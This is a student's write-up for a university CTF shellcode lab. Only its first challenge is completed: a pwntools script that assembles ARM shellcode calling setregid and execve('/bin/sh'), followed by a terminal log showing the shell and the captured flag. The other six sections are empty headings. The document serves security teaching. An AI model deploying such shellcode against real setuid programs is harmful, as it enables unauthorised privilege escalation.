# Write-up for Unit2-2

- netID: TXK220008
- Name: Takemaru Kadoi

All the write-ups are supposed to use this import.

```python
from pwn import *
```

## 1-shellcode-arm

The problem statement is below.

````md
Write a ARM shellcode that runs:

```c
setregid(getegid(), getegid())
execve("/bin/sh", 0, 0);
```

and put the shellcode binary (`shellcode.bin`) into this directory.
````

The given binary is arm 32bit.

```bash
TXK220008@ctf-vm3:~/unit2/1-shellcode-arm $ checksec 1/1-shellcode-arm
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[*] '/home/TXK220008/unit2/1-shellcode-arm/1-shellcode-arm'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
```

This problem just requires you to translate what you solved in Unit2-1's level1.

The whole code will be like this.

```python
#!/usr/bin/env python3
from pwn import *
from pwn import asm, process

context.arch = 'arm'
# setregid(getegid(), getegid())
# getegid: 50(%r7)
# setregid: 71(%r7) (%r0 = gid_t rgid, %r1 = gid_t rgid)
shellcode = asm(
    """
mov     r7, 50
swi     0
mov     r1, r0
mov     r7, 71
swi     0
"""
)
# execve("/bin/sh", 0, 0)
# execve: 11(%r7) (%r0 = const char *filename, %r1 = const char *argv[], %r2 = const char *envp[])
shellcode += asm(
    """
adr     r0, _bin_sh
mov     r1, 0
mov     r2, 0
mov     r7, 11
swi     0
_bin_sh:
    .asciz "/bin/sh"
"""
)

with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)

```

Then, you get the flag.

```bash
TXK220008@ctf-vm3:~/unit2/1-shellcode-arm $ ./solve1.py; ./1-shellcode-arm
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
Reading shellcode from shellcode.bin
$ cat flag
CS6332{welcome_to_arm}
```

## 2-nonzero-shellcode-arm

The problem statement is below.

```md

```

## 3-ascii-shellcode-arm

The problem statement is below.

```md

```

## 4-short-shellcode-arm

The problem statement is below.

```md

```

## 5-stack-ovfl-arm

The problem statement is below.

```md

```

## 6-stack-ovfl-use-envp-arm

The problem statement is below.

```md

```

## 7-stack-ovfl-no-envp-arm

The problem statement is below.

```md

```
